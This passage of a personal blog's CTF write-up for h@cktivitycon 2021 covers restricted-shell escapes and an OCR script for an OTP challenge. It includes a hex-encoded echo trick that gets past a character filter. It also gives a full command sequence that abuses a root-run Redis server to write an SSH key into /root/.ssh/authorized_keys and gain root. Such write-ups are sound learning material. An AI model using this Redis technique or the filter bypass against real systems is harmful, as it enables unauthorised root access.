+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><h3 id="bad-words">Bad Words<a href="#bad-words">
+    <svg role="img" aria-labelledby="bad-words-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="bad-words-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>We were presented with a shell in this challenge, and we had to find the flag there. I tried running <code>ls</code>, but it was forbidden because it contained a &ldquo;bad word&rdquo;. After trying some other basic commands, I had to realize that all of them were forbidden.</p>
+<p>At this point, I randomly tried to call <code>ls</code> with its full path (<code>/bin/ls</code>), and to my surprise, it worked. After this, all I had to do was traversing the directory structure using <code>/bin/ls</code> and printing the flag with <code>/bin/cat</code> once I found it.</p>
+
+
+  <span class="code-language">bash</span><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@host:/home/user$ /bin/cat just/out/of/reach/flag.txt
+</span></span><span style="display:flex;"><span>/bin/cat just/out/of/reach/flag.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span style="color:#f92672">}</span></span></span></code></pre></div>
+<h3 id="shelle">Shelle<a href="#shelle">
+    <svg role="img" aria-labelledby="shelle-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="shelle-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>In this challenge, we got access to a shell with some limitations. We only had a few commands that we could use, but <code>ls</code> was one of them, so I ran it. In the output, I’ve seen that there&rsquo;s an <code>assignment.txt</code> in the current folder, so I printed it. It was a task list for the students who were supposed to use the system, but it also said that the flag is in <code>/opt</code>. I tried to print the flag using <code>cat</code>, but I got an error that my command contained an illegal character.</p>
+<p>After some trial, I found that <code>/</code> was illegal (among a few other characters). I tried to bypass the check by encoding the character, but it wasn&rsquo;t working at first. After some googling, I found that I have to use the <code>-e</code> flag for echo to enable interpreting backslash-escaped characters (FYI: I&rsquo;m using Mac OS, and the version of <code>echo</code> there doesn&rsquo;t require any flag for escaping to work correctly). After this realization, I could craft a command that could print the flag, and it worked flawlessly.</p>
+
+
+  <span class="code-language">bash</span><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; cat <span style="color:#66d9ef">$(</span>echo -e <span style="color:#e6db74">&#34;\x2fopt\x2fflag.txt&#34;</span><span style="color:#66d9ef">)</span></span></span></code></pre></div>
+<h3 id="redlike">Redlike<a href="#redlike">
+    <svg role="img" aria-labelledby="redlike-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="redlike-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in <code>/root</code>. I had no idea how to start, so I began to look into basic things after connecting to the remote machine. I&rsquo;ve seen that the machine is running Ubuntu 20.4 LTS with a recent kernel. I tried to look for local privilege escalations in these but with no luck.</p>
+<p>After some search, I stumbled upon <a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank" rel="noopener">this</a> article about a few basic ideas on how to start in these scenarios. I tried the techniques one-by-one, and 2 of them looked like a possible solution. First, I tried to see if I could exploit the cron jobs to create a root shell, but I had no success. After that, my attention shifted to the other possibility. I&rsquo;d previously seen that there&rsquo;s a Redis server running as root. In the article, they showed us an example for MySQL running as root, but I thought it was worth trying.</p>
+<p>After some research, I found <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html" target="_blank" rel="noopener">this</a> article explaining how we can use Redis to add our own ssh key to any user&rsquo;s authorized keys. I followed the steps, and after only a few minutes, I could SSH to localhost as root and read the flag.</p>
+
+
+  <span class="code-language">bash</span><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen
+</span></span><span style="display:flex;"><span>Generating public/private rsa key pair.
+</span></span><span style="display:flex;"><span>Enter file in which to save the key <span style="color:#f92672">(</span>/home/user/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Enter same passphrase again:
+</span></span><span style="display:flex;"><span>Your identification has been saved in ./id_rsa
+</span></span><span style="display:flex;"><span>Your public key has been saved in ./id_rsa.pub
+</span></span><span style="display:flex;"><span>The key fingerprint is:
+</span></span><span style="display:flex;"><span>SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g
+</span></span><span style="display:flex;"><span>The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
+</span></span><span style="display:flex;"><span>+---<span style="color:#f92672">[</span>RSA 3072<span style="color:#f92672">]</span>----+
+</span></span><span style="display:flex;"><span>|            .ooo+|
+</span></span><span style="display:flex;"><span>|         E .  .<span style="color:#f92672">=</span>o|
+</span></span><span style="display:flex;"><span>|          .   +.*|
+</span></span><span style="display:flex;"><span>|               Xo|
+</span></span><span style="display:flex;"><span>|        S +   ++B|
+</span></span><span style="display:flex;"><span>|         + *  .oO|
+</span></span><span style="display:flex;"><span>|        . <span style="color:#f92672">=</span> o  <span style="color:#f92672">+=</span>|
+</span></span><span style="display:flex;"><span>|           + oo<span style="color:#f92672">=</span>B|
+</span></span><span style="display:flex;"><span>|            +.+X%|
+</span></span><span style="display:flex;"><span>+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dir /root/.ssh/
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config get dir
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;dir&#34;</span>
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;/root/.ssh&#34;</span>
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; save
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt;
+</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.120+ x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span>not required on a system that users <span style="color:#66d9ef">do</span> not log into.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span style="color:#f92672">}</span></span></span></code></pre></div>
+<h2 id="scripting">Scripting<a href="#scripting">
+    <svg role="img" aria-labelledby="scripting-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="scripting-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><h3 id="words-church">Words Church<a href="#words-church">
+    <svg role="img" aria-labelledby="words-church-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="words-church-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>There&rsquo;s not too much to write about this challenge; we had to find words in a grid. The catch was that we had to find a total of 150 words (with the grid changing after every 5th word), so it would&rsquo;ve taken too much time to do it by hand. For this reason, I wrote a script that connected to the server, parsed the grid every time we got a new one and searched for the word in the grid with a simple brute force algorithm. You can find the script <a href="https://gist.github.com/PsHegger/1c122885e81d84bafcd3641fe82d6fb7" target="_blank" rel="noopener">here</a>.</p>
+<h3 id="otp-smasher">OTP Smasher<a href="#otp-smasher">
+    <svg role="img" aria-labelledby="otp-smasher-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="otp-smasher-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h3><p>In this challenge, we were presented with a website that contained only an image and a form with one input field. The picture had only a few numbers on a black background. I tried entering the number on the image into the form, and after I submitted it, I got back the same page but with a few changes: a counter number increased by 1, and the image had changed. After checking the Chrome Developer console, I could also see that the site was trying to load <code>flag.png</code>, but the server returned <code>404</code>. After entering the numbers on the image a few more times, I realized something: the counter sometimes goes up, but sometimes it resets even when I enter the correct number. I assumed that the counter resets when too much time passes between entering two numbers. I didn’t know how many times I had to enter the number, so I wrote a script to automate the task.</p>
+<p>I started by looking into some kind of OCR I could use, and I quickly found <a href="https://github.com/tesseract-ocr/tesseract" target="_blank" rel="noopener">Tesseract</a>. I wrote a script to download the image from the server, run OCR on it, and send the recognized number back to the server. This ran in a loop, and every time after it submitted a code, I tried to download the flag. When it was available, I saved it and ended the loop.</p>
+<p>In theory, it was a good approach, but for some reason, it always failed after solving a few images. After debugging a bit, I saw that Tesseract didn&rsquo;t recognize the number correctly, so I started to look into solutions to make it more reliable. After searching a bit, I found that I could set a whitelist for characters to be used. I set up the whitelist to only contain the numbers 0-9, but the recognition was still unreliable even after that.</p>
+<p>After trying a few things (settings various recognition options, cropping the picture to only contain the numbers), I found the correct solution: I had to invert the colors of the image so that the background becomes white and the text on it becomes black (I used <a href="https://imagemagick.org/" target="_blank" rel="noopener">ImageMagick</a> for this). This simple change instantly solved all my problems. In the end, I needed two commands to get the number from the image:</p>
+<ol>
+<li>invert the colors of the image: <code>convert otp.png -channel RGB -negate otp.png</code></li>
+<li>run OCR on the image: <code>tesseract -l eng otp.png otp -c tessedit_char_whitelist=0123456789</code></li>
+</ol>
+<p>You can find the full script <a href="https://gist.github.com/PsHegger/b0af5e24831c6b700854c9fc282d445c" target="_blank" rel="noopener">here</a>.</p>
+<hr>
+<h2 id="conclusions">Conclusions<a href="#conclusions">
+    <svg role="img" aria-labelledby="conclusions-IconTitle" fill="var(--color-primary)" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg">
+      <title id="conclusions-IconTitle">Link to this heading</title>
+      <path d="M0 0h24v24H0z" fill="none"></path>
+      <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"></path>
+    </svg>
+  </a>
+</h2><p>In the end, I solved 17 challenges, mainly the easy ones, but I managed to solve 5 medium ones too. 4 of these medium ones wasn&rsquo;t solved by enough people to have their score reduced to the minimum 50 points, so I&rsquo;m delighted that I managed to do them.</p>
+<p>I got 1838 points, and with that, my team (with me being the only member in it) finished at 186th place (out of 1721 teams).</p>
+<p>I think this is a pretty good result for my first CTF, and it encourages me to participate in other ones in the future. In the past, I was reluctant to these events because I was afraid that my knowledge was not enough to enjoy it. After this one, I see that even if I cannot solve a challenge, I can still enjoy it and learn a lot, especially that it makes me want to know the solutions and read the writeups after the event has ended.</p>
+
+    </article>
+    <aside>
+      <div class="single-terms">
+        
+          
+          <a class="term" href="https://pshegger.github.io/tags/ctf/">ctf</a></li>
+          
+          <a class="term" href="https://pshegger.github.io/tags/writeup/">writeup</a></li>
+          
+          <a class="term" href="https://pshegger.github.io/tags/hacktivitycon/">hacktivitycon</a></li>
+          
+          <a class="term" href="https://pshegger.github.io/tags/hackerone/">hackerone</a></li>
+          
+          <a class="term" href="https://pshegger.github.io/tags/cryptography/">cryptography</a></li>
+          
+          <a class="term" href="https://pshegger.github.io/tags/python/">python</a></li>
+          
+        
+      </div>
+      
+  
+  
+  
+
+  <section>
+    <h2>Share</h2>
+    <div class="social-links">
+      <ul class="social-icons--share">
+        
+        
+        <a href="https://twitter.com/intent/tweet?url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&amp;text=h%40cktivitycon%202021%20CTF" target="_blank" rel="noopener" aria-label="Share on Twitter" class="social-btn twitter">
+          <li><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-twitter" width="24" height="24" viewBox="0 0 384 312" fill="var(--color-primary)"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg></li>
+        </a>
+        
+        
+        
+        <a href="https://www.reddit.com/submit?url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f" target="_blank" rel="noopener" aria-label="Share on Reddit" class="social-btn reddit">
+          <li><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-reddit" width="24" height="24" viewBox="0 0 24 24" fill="var(--color-primary)"><path d="M24 11.779c0-1.459-1.192-2.645-2.657-2.645-.715 0-1.363.286-1.84.746-1.81-1.191-4.259-1.949-6.971-2.046l1.483-4.669 4.016.941-.006.058c0 1.193.975 2.163 2.174 2.163 1.198 0 2.172-.97 2.172-2.163s-.975-2.164-2.172-2.164c-.92 0-1.704.574-2.021 1.379l-4.329-1.015c-.189-.046-.381.063-.44.249l-1.654 5.207c-2.838.034-5.409.798-7.3 2.025-.474-.438-1.103-.712-1.799-.712-1.465 0-2.656 1.187-2.656 2.646 0 .97.533 1.811 1.317 2.271-.052.282-.086.567-.086.857 0 3.911 4.808 7.093 10.719 7.093s10.72-3.182 10.72-7.093c0-.274-.029-.544-.075-.81.832-.447 1.405-1.312 1.405-2.318zm-17.224 1.816c0-.868.71-1.575 1.582-1.575.872 0 1.581.707 1.581 1.575s-.709 1.574-1.581 1.574-1.582-.706-1.582-1.574zm9.061 4.669c-.797.793-2.048 1.179-3.824 1.179l-.013-.003-.013.003c-1.777 0-3.028-.386-3.824-1.179-.145-.144-.145-.379 0-.523.145-.145.381-.145.526 0 .65.647 1.729.961 3.298.961l.013.003.013-.003c1.569 0 2.648-.315 3.298-.962.145-.145.381-.144.526 0 .145.145.145.379 0 .524zm-.189-3.095c-.872 0-1.581-.706-1.581-1.574 0-.868.709-1.575 1.581-1.575s1.581.707 1.581 1.575-.709 1.574-1.581 1.574z"/></svg></li>
+        </a>
+        
+        
+                
+        <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f" target="_blank" rel="noopener" aria-label="Share on Facebook" class="social-btn facebook">
+          <li><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-facebook" width="24" height="24" viewBox="0 0 352 352" fill="var(--color-primary)"><path d="m0 32v288c0 17.5 14.5 32 32 32h288c17.5 0 32-14.5 32-32v-288c0-17.5-14.5-32-32-32h-288c-17.5 0-32 14.5-32 32zm320 0v288h-83v-108h41.5l6-48h-47.5v-31c0-14 3.5-23.5 23.5-23.5h26v-43.5c-4.4-.6-19.8-1.5-37.5-1.5-36.9 0-62 22.2-62 63.5v36h-42v48h42v108h-155v-288z"/></svg></li>
+        </a>
+        
+        
+        
+        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&amp;source=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&amp;title=h%40cktivitycon%202021%20CTF&amp;summary=h%40cktivitycon%202021%20CTF" target="_blank" rel="noopener" aria-label="Share on LinkedIn" class="social-btn linkedin">
+          <li><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-linkedin" width="24" height="24" viewBox="0 0 352 352" fill="var(--color-primary)"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg></li>
+        </a>
+        
+        
+        
+        <a href="mailto:?subject=pshegger%20-%20h%40cktivitycon%202021%20CTF.&amp;body=h%40cktivitycon%202021%20CTF%2c%20by%20pshegger%0aWriteups%20and%20my%20thoughts%20about%20the%202021%20h%40cktivitycon%20CTF%0a%0ahttps%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f%0a" target="_blank" class="social-btn email">
+          <li><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-mail" width="24" height="24" viewBox="0 0 416 288" fill="var(--color-primary)"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg></li>
+        </a>
+      </ul>
+    </div>
+  </section>
+  
+        
+
+  
+  
+
+        
+  <section>
+    <h2>Read Next</h2>
+    <div class="single-next-previous">
+      
+        <a class="previous" href="https://pshegger.github.io/posts/aoc-2020/">&laquo; Advent of Code 2020</a>
+      
+      
+        <a class="next" href="https://pshegger.github.io/posts/procedural-dungeon/">Procedural Dungeon Generation &raquo;</a>
+      
+    </div>
+  </section>
+
+      
+    </aside>
+  </div>
+</div>
+
+    </main><footer>
+  
+  <div class="section footer">
+    <p class="footer-copyright">&copy; 2023 &middot; 
+      <a href="https://pshegger.github.io/">pshegger</a>
+      
+    </p>
+    
+      <div class="footer-socials">
+        
+<div class="social-links">
+  <ul class="social-icons">
+    
+    
+    <li>
+      <a href="https://twitter.com/pshegger" target="_blank" rel="noopener" aria-label="Visit Twitter profile" class="social-btn twitter">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-twitter" width="24" height="24" viewBox="0 0 384 312" fill="var(--color-primary)"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+      </a>
+    </li>
+    
+
+    
+    
+    <li>
+      <a href="https://github.com/pshegger" target="_blank" rel="noopener" aria-label="Visit Github profile" class="social-btn github">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-github" width="24" height="24" viewBox="0 0 24 24" fill="var(--color-primary)"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+      </a>
+    </li>
+    
+
+    
+    
+    <li>
+      <a href="https://stackoverflow.com/users/751482/pshegger" target="_blank" rel="noopener" aria-label="Visit Stack Overflow profile" class="social-btn stack-overflow">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-stack-overflow" width="24" height="24" viewBox="0 0 24 24" fill="var(--color-primary)"><path d="M15 21h-10v-2h10v2zm6-11.665l-1.621-9.335-1.993.346 1.62 9.335 1.994-.346zm-5.964 6.937l-9.746-.975-.186 2.016 9.755.879.177-1.92zm.538-2.587l-9.276-2.608-.526 1.954 9.306 2.5.496-1.846zm1.204-2.413l-8.297-4.864-1.029 1.743 8.298 4.865 1.028-1.744zm1.866-1.467l-5.339-7.829-1.672 1.14 5.339 7.829 1.672-1.14zm-2.644 4.195v8h-12v-8h-2v10h16v-10h-2z"/></svg>
+      </a>
+    </li>
+    
+
+    
+    
+
+    
+    
+    <li>
+      <a href="mailto:?to=pshegger%40gmail.com" target="_blank" class="social-btn email">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-mail" width="24" height="24" viewBox="0 0 416 288" fill="var(--color-primary)"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+      </div>
+    
+  </div>
+</footer>
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    
+
+<script src="https://pshegger.github.io/main.min.js"></script>
+
+
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NKBPT9CS94"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-NKBPT9CS94', { 'anonymize_ip': false });
+}
+</script>
+
+</body>
+</html>
